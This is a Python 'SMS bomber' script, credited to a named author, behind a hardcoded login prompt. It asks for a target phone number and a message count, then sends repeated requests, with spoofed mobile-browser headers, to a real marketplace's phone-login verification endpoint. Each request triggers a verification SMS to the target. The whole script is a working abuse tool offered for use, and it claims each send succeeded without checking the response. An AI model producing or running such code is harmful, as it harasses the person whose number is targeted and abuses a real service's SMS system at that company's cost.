import requests
import time
import sys
import os

def animated(text):
    for x in text:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.005)

os.system("clear")
os.system("figlet Welcome")

username = "Jabbar"
password = "1234"
name = input(" \033[1;34mEnter username: ")
paswd = input("Enter password: ")
os.system("clear")

if name == username and paswd == password:
    animated("\t\t\n\033[1;32m                Login Successful!\n")
    animated("\n                Tool is Loading......")
    time.sleep(5)
else:
    print("\033[31mWrong password or username!\033[0m")
    exit()

os.system("clear")

logo = '''
\033[1;31m
                  ######  ####### #     # ### #       
                  #     # #       #     #  #  #       
                  #     # #       #     #  #  #       
                  #     # #####   #     #  #  #       
                  #     # #        #   #   #  #       
                  #     # #         # #    #  #       
                  ######  #######    #    ### #######
   
'''

information = '''
\033[1;32m   ===========================================================\033[1;36m
         AUTHOR   : Abdul Jabbar 
         Git Hub  : https://github.com/jsjabbar0
         Facebook : https://www.facebook.com/abdul.jabbar.267611
         Coder    : Jabbar 
\033[1;32m   ============================================================            
'''
animated(logo)
animated(information)

number = input("Enter target number: ")
sms = int(input("Enter amount: "))
count = 0

while count < sms:
    try:
        headers = {
            'authority': 'bikroy.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'bn',
            'application-name': 'web',
            'referer': 'https://bikroy.com/bn/users/login',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }

        params = {
            'phone': number,
        }

        response = requests.get(
            'https://bikroy.com/data/phone_number_login/verifications/phone_login',
            params=params,
            headers=headers,
        )

        print(f"\033[32m[✓] SMS sent successful!  [{count+1}]\033[0m")
        count += 1
        time.sleep(1)

    except Exception as e:
        print("Error occurred:", str(e))
        break